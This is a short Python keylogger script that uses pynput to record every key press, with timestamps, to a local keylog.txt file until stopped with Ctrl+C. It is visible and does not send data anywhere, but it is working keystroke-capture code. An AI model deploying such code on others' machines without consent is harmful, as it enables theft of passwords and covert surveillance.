from pynput import keyboard
from pynput.keyboard import Listener
import time

def on_key_press(key, log_file):
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        log_file.write(f"{timestamp} - {key}\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def main():
    print("Press Ctrl+C to stop logging.")
    log_file = open("keylog.txt", "a")
    with Listener(on_press=lambda key: on_key_press(key, log_file)) as listener:
        listener.join()
    log_file.close()

if __name__ == "__main__":
    main()
